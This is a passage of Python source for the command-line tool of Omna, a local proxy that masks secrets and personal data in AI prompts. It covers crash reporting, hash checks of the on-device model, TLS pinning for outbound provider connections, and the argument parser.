    print(f"\nStored in {crashlog.path()}, masked by Omna's own engine before it was written.")
    print(f"Right now these are: {setting}.")
    print("  omna crash --show N   read one in full")
    print("  omna crash --send     send the pending ones now")
    print("  omna crash --always / --never   change the answer")
    print("  omna crash --issue    open a pre-filled GitHub issue instead")
    return 0


def _print_crash(r: dict) -> None:
    print(f"when:     {r.get('ts')}")
    print(f"where:    {r.get('where')}")
    print(f"error:    {r.get('error')}")
    print(f"message:  {r.get('message')}")
    print(f"versions: plugin {r.get('plugin')} · engine {r.get('engine')} · Python {r.get('python')} · {r.get('os')}")
    print("trace:")
    for f in r.get("traceback", []):
        print(f"    {f.get('file')}:{f.get('line')} in {f.get('fn')}")


def cmd_verify_model(a) -> int:
    """Re-hash the on-device Contextual model and compare it to what this
    engine was built against (#135).

    The model is the thing that decides what counts as private data, so a
    swapped one could simply stop detecting. This is the command a security
    review runs; it does the full hash every time, never a cached answer.
    """
    import omna_pii_mask

    if not hasattr(omna_pii_mask, "verify_model"):
        print("omna: this engine build has no model verification "
              f"(engine {omna_pii_mask.version()}). Upgrade the engine wheel to use it.", file=sys.stderr)
        return 1
    try:
        from . import smart as smart_models

        rows = smart_models.verify_models()
    except TypeError:  # an engine wheel older than the two-model one (< 0.2.17)
        rows = [{**r, "model": "openai-privacy-filter"} for r in omna_pii_mask.verify_model()]
    missing = [r for r in rows if r["detail"] == "not downloaded"]
    bad = [r for r in rows if not r["ok"] and r not in missing]
    for r in rows:
        mark = "ok  " if r["ok"] else "FAIL"
        print(f"{mark}  {r['model']:<15} {r['file']:<24} {r['detail']}")
    if len(missing) == len(rows):
        print("\nomna: the smart models aren't downloaded yet — nothing to verify. They arrive on the first\n"
              "      `--smart` run, and every file is checked against its pinned hash as it streams in.")
        return 0
    if bad:
        print(f"\nomna: {len(bad)} file(s) FAILED. That means a model on this machine is not the one\n"
              "      Omna was built against. Delete the model cache and let it download again.")
        return 1
    print("\nomna: every model file matches the hash this engine was built against.")
    return 0


def cmd_tls(a) -> int:
    """Show or change how Omna verifies the AI provider on the way OUT.

    Worth a command of its own because this is the leg people forget: Omna
    opens your request, so if something could impersonate the provider to
    Omna, it would receive a masked prompt AND your real API key.
    """
    from . import upstream_tls

    pol = Policy.load()

    if a.action == "strict" or a.action == "default":
        pol.tls_strict = (a.action == "strict")
        _save_policy(pol, a)
        if pol.tls_strict:
            print("omna: providers are now verified against the certifi bundle, not this\n"
                  "      machine's trust store — so the certificate `omna init` installed for\n"
                  "      the inbound side cannot vouch for a provider on the outbound side.")
        else:
            print("omna: back to the default — providers are verified against this machine's trust store.")
        return 0

    if a.action == "pin":
        if not a.host:
            print("omna: which host? e.g. `omna tls pin api.anthropic.com`", file=sys.stderr)
            return 1
        host = a.host.lower()
        try:
            pins = upstream_tls.fetch_pins(host)
        except OSError as e:
            print(f"omna: could not reach {host}: {e}", file=sys.stderr)
            return 1
        if not pins:
            print(f"omna: {host} presented no certificate to pin", file=sys.stderr)
            return 1
        print(f"omna: {host} is currently presenting these public keys, leaf first:")
        for i, pin in enumerate(pins):
            print(f"  [{i}] {pin}" + ("   <- leaf (rotates most often)" if i == 0 else
                                      "   <- intermediate (safer to pin)"))
        if not a.save:
            print("\nNothing was saved. Add `--save` to pin, and read this first:")
            print("  Pinning means Omna REFUSES to send if the certificate stops matching.")
            print("  Providers rotate certificates. When they do, you must run this again")
            print("  or Omna will stop working against that host. Pin the intermediate if")
            print("  you can — it survives leaf rotation.")
            return 0
        pol.tls_pins[host] = pins
        _save_policy(pol, a)
        print(f"\nomna: pinned {len(pins)} key(s) for {host}. Remove with `omna tls unpin {host}`.")
        return 0

    if a.action == "unpin":
        if not a.host:
            print("omna: which host?", file=sys.stderr)
            return 1
        if pol.tls_pins.pop(a.host.lower(), None) is None:
            print(f"omna: {a.host} was not pinned")
            return 0
        _save_policy(pol, a)
        print(f"omna: unpinned {a.host}")
        return 0

    # no action: show the state
    mode = "strict (certifi bundle)" if pol.tls_strict else "this machine's trust store (default)"
    print(f"outbound verification: {mode}")
    if pol.tls_pins:
        print("pinned hosts:")
        for host, pins in sorted(pol.tls_pins.items()):
            print(f"  {host}: {len(pins)} key(s)")
        print("\nA pinned host stops working if its certificate rotates. Re-run")
        print("`omna tls pin <host> --save` when that happens.")
    else:
        print("pinned hosts: none  (pinning is off by default — an unattended pin is a time bomb)")
    print("\n  omna tls strict          verify providers against certifi, not your trust store")
    print("  omna tls default         back to your machine's trust store")
    print("  omna tls pin HOST        show the live keys for HOST (add --save to pin them)")
    print("  omna tls unpin HOST      remove a pin")
    return 0


def cmd_version(a) -> int:
    from .engine import engine_version
    from .proxy import __version__

    print(f"omna-plugin {__version__} (engine {engine_version()})")
    return 0


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(prog="omna", description="Omna — mask secrets and PII before a prompt leaves your machine.")
    sub = p.add_subparsers(dest="cmd", required=True)

    def add_port(sp):
        sp.add_argument("--port", type=int, default=config.DEFAULT_PORT)

    s = sub.add_parser("start", help="run the masking proxy"); add_port(s)
    s.add_argument("-d", "--daemon", action="store_true", help="run in the background")
    s.add_argument("--smart", action="store_true", help="also run the on-device smart models (L3), chosen automatically; catches names written in sentences")
    s.add_argument("--no-restore-secrets", action="store_true", help="redact secrets for good (engine default) instead of numbered tokens restored locally; breaks edits to lines that contain a key. Saved: stays on after a restart")
    s.add_argument("--restore-secrets", action="store_true", help="undo --no-restore-secrets (saved)")
    s.set_defaults(fn=cmd_start)
    s = sub.add_parser("stop", help="stop the background proxy"); add_port(s); s.set_defaults(fn=cmd_stop)
    s = sub.add_parser("restart-worker", help="internal: finishes a restart even if the command that asked for it is killed"); add_port(s)
    s.add_argument("--smart", action="store_true"); s.add_argument("--no-restore-secrets", action="store_true")
    s.set_defaults(fn=cmd_restart_worker)
    s = sub.add_parser("ensure", help="start the background proxy if needed"); add_port(s)
    s.add_argument("--smart", action="store_true"); s.set_defaults(fn=cmd_ensure)
    s = sub.add_parser("status", help="is Omna protecting me? (--details: the full screen)"); add_port(s)
    s.add_argument("--details", action="store_true", help="the full technical screen")
    s.set_defaults(fn=cmd_status)
    s = sub.add_parser("log", help="show local receipts")
    s.add_argument("-n", type=int, default=20); s.add_argument("--verify", action="store_true"); s.add_argument("--json", action="store_true")
    s.set_defaults(fn=cmd_log)
    s = sub.add_parser("mask", help="mask a piece of text, or `mask app NAME` to set an app's action to mask")
    s.add_argument("text", nargs="*"); s.add_argument("--smart", action="store_true"); s.add_argument("--counts", action="store_true")
    s.add_argument("--realistic", action="store_true", help="show the realistic style instead of numbered tokens")
    add_port(s)
    s.set_defaults(fn=cmd_mask)
    s = sub.add_parser("style", help="how a masked value is written: a numbered token (default) or a realistic fake value")
    s.add_argument("value", nargs="?", choices=list(STYLES),
                   help="tokens (default, every door) or realistic (browser only)")
    add_port(s); s.set_defaults(fn=cmd_style)
    s = sub.add_parser("smart", help="smart masking on/off (catches names and addresses written in sentences)")
    s.add_argument("state", nargs="?", choices=["on", "off"]); add_port(s); s.set_defaults(fn=cmd_smart)
    s = sub.add_parser("privacy-filter", help="the OpenAI privacy-filter model on/off (off by default: faster, less memory)")
    s.add_argument("state", nargs="?", choices=["on", "off"]); add_port(s); s.set_defaults(fn=cmd_privacy_filter)
    s = sub.add_parser("tool-calls", help="what goes back into an agent's commands and files: secrets (off by default), personal data (on)")
    s.add_argument("kind", nargs="?", choices=["secrets", "personal"]); s.add_argument("state", nargs="?", choices=["on", "off"])
    s.set_defaults(fn=cmd_tool_calls)
    s = sub.add_parser("categories", help="what Omna masks; `categories off PHONE` lets a category through (never secrets)")
    s.add_argument("action", nargs="?", choices=["on", "off"]); s.add_argument("names", nargs="*"); add_port(s)
    s.set_defaults(fn=cmd_categories)
    s = sub.add_parser("allow", help="never mask this value again"); s.add_argument("value"); s.set_defaults(fn=cmd_allow)
    s = sub.add_parser("mask-always", help="always mask this value (a client, a project name)")
    s.add_argument("value"); s.add_argument("--label", default="CLIENT", help="the stand-in name, e.g. CLIENT -> [CLIENT_1]")
    s.set_defaults(fn=cmd_mask_always)
    s = sub.add_parser("forget", help="wipe the token registry"); s.set_defaults(fn=cmd_forget)
    s = sub.add_parser("init", help="wire Claude Code (and, on a Mac, the system proxy + certificate)"); add_port(s)
    s.add_argument("--project", action="store_true", help="write ./.claude/settings.json instead of ~/.claude/settings.json")
    s.add_argument("--no-system", dest="no_system", action="store_true", help="skip the Mac system-wide proxy + certificate; Claude Code only")
    s.set_defaults(fn=cmd_init)
    s = sub.add_parser("uninstall", help="undo init (Claude Code + Mac system proxy/certificate)"); s.add_argument("--project", action="store_true"); s.set_defaults(fn=cmd_uninstall)
    s = sub.add_parser("menubar", help="a status icon: on/off, what's covered, Uninstall"); add_port(s); s.set_defaults(fn=cmd_menubar)
    s = sub.add_parser("report", help="weekly summary from the receipts (text, --json, --html FILE, --export FILE, --merge FILES)")
    s.add_argument("--days", type=int, default=7); s.add_argument("--json", action="store_true"); s.add_argument("--html", metavar="FILE")
    s.add_argument("--export", metavar="FILE", help="write a counts-only file safe to hand to a company admin")
    s.add_argument("--merge", nargs="+", metavar="FILE", help="add up exported files into a company + per-department view")
    s.set_defaults(fn=cmd_report)
    s = sub.add_parser("dashboard", help="open the live dashboard in your browser")
    add_port(s); s.set_defaults(fn=cmd_dashboard)
    s = sub.add_parser("mappings", help="open the mappings review screen in your browser")
    add_port(s); s.set_defaults(fn=cmd_mappings)
    s = sub.add_parser("enroll", help="tag this machine with an organisation/department for company reports")
    s.add_argument("--org", default="", help="organisation name")
    s.add_argument("--dept", default="", help="department name")
    s.add_argument("--forget", action="store_true", help="remove the tags and the device id")
    s.set_defaults(fn=cmd_enroll)
    s = sub.add_parser("tools", help="show tool policy (on/off)"); s.set_defaults(fn=cmd_tools)
    s = sub.add_parser("enable", help="turn a tool on (claude-code, aider, codex also wire it)"); s.add_argument("tool"); add_port(s); s.set_defaults(fn=cmd_enable)
    s = sub.add_parser("disable", help="turn a tool off (claude-code, aider, codex also unwire it)"); s.add_argument("tool"); add_port(s); s.set_defaults(fn=cmd_disable)
    s = sub.add_parser("apps", help="show app policy (mask/bypass)"); s.set_defaults(fn=cmd_apps)
    s = sub.add_parser("bypass", help="`bypass app NAME` — never mask this app's traffic"); add_port(s)
    s.add_argument("kind", choices=["app"]); s.add_argument("name"); s.set_defaults(fn=cmd_bypass)
    s = sub.add_parser("capture", help="`capture app NAME` — Stage 3 deep-capture for an app that ignores the system proxy"); add_port(s)
    s.add_argument("kind", choices=["app"]); s.add_argument("name"); s.set_defaults(fn=cmd_capture)
    s = sub.add_parser("hosts", help="show, or add/remove, the hostnames counted as AI"); add_port(s)
    s.add_argument("action", nargs="?", choices=["add", "remove"]); s.add_argument("host", nargs="?")
    s.set_defaults(fn=cmd_hosts)
    s = sub.add_parser("crash", help="what broke on this machine (kept locally; sent only if you said yes)")
    s.add_argument("--show", type=int, metavar="N", help="print crash N in full")
    s.add_argument("--send", action="store_true", help="send the pending reports now")
    s.add_argument("--issue", action="store_true", help="open a GitHub issue pre-filled with the report instead")
    s.add_argument("--always", action="store_true", help="send crash reports automatically from now on")
    s.add_argument("--never", action="store_true", help="never send crash reports (they stay on this machine)")
    s.add_argument("--clear", action="store_true", help="delete the local crash log")
    s.set_defaults(fn=cmd_crash)
    s = sub.add_parser("verify-model", help="re-hash the on-device model and check it against its pinned hash")
    s.set_defaults(fn=cmd_verify_model)
    s = sub.add_parser("tls", help="how Omna verifies the AI provider on the way out")
    s.add_argument("action", nargs="?", choices=["strict", "default", "pin", "unpin"])
    s.add_argument("host", nargs="?")
    s.add_argument("--save", action="store_true", help="actually store the pins that `pin` shows")
    add_port(s); s.set_defaults(fn=cmd_tls)
    s = sub.add_parser("version"); s.set_defaults(fn=cmd_version)
    return p


def maybe_ask_about_crashes(cmd: str) -> None:
    """Ask the one crash-reporting question, at the right moment or not at all.

    Four gates, all of which must pass (#132):
      - something actually broke and has not been sent;
      - we have never asked (a "no" is final);
      - there is a real terminal — never prompt a script, a hook, or a daemon;
      - this is not `ensure`, which the Claude Code SessionStart hook runs, and
        which must stay silent because anything it prints becomes model context.
    After a yes, anything still pending is sent immediately.
    """
    if cmd in ("ensure", "menubar", "start"):
        return
    try:
        if not (sys.stdin.isatty() and sys.stderr.isatty()):
            return
        if not crashlog.should_ask():
            if crashlog.may_send():
                from . import crashsend

                crashsend.send_pending()
            return
        from . import crashsend

        if crashsend.ask_and_remember(crashlog.unsent()):
            crashsend.send_pending()
    except Exception:
        return  # consent plumbing must never break a command


def main(argv: list[str] | None = None) -> int:
    args = sys.argv[1:] if argv is None else argv
    config.tidy_no_proxy()  # a "[::1]" in NO_PROXY used to crash every httpx call (Muse B1)
    if args[:1] == ["native-host"]:
        # Chrome runs this for Omna for Chrome (finding 6) with arguments of
        # its own (the caller's origin; a window handle on Windows), so it is
        # handled before argparse, which would refuse them.
        return extension_auth.native_host_main(args[1:])
    parser = build_parser()
    if args and not args[0].startswith("-"):
        # A typo gets one helpful line, not the whole usage wall (client test 2026-11-21, #21).
        cmds = next((list(x.choices) for x in getattr(parser, "_actions", [])
                     if isinstance(x, argparse._SubParsersAction)), None)
        if cmds and args[0] not in cmds:
            import difflib
            near = difflib.get_close_matches(args[0], cmds, n=1)
            hint = f" — did you mean `omna {near[0]}`?" if near else ""
            print(f"omna: unknown command '{args[0]}'{hint}  (all commands: `omna --help`)", file=sys.stderr)
            return 2
    a = parser.parse_args(argv)
    try:
        rc = a.fn(a)
        maybe_ask_about_crashes(a.cmd)
        return rc
    except (KeyboardInterrupt, SystemExit):
        raise
    except BrokenPipeError:
        # The output was cut short (`omna log | head`): not a crash (client
        # test 2026-11-21, #20). Point stdout at nowhere so Python's own flush
        # at exit does not raise again.
        try:
            sys.stdout = open(os.devnull, "w")
        except OSError:
            pass
        return 0
    except BaseException as e:
        # Record it locally (masked, never sent — see crashlog.py) and then let
        # it surface exactly as it would have, so nothing is swallowed.
        crashlog.record(e, where=f"cli:{a.cmd}")
        print(f"omna: this crashed. It was recorded locally — run `omna crash` to see it "
              f"(nothing was sent anywhere).", file=sys.stderr)
        raise


if __name__ == "__main__":
    sys.exit(main())
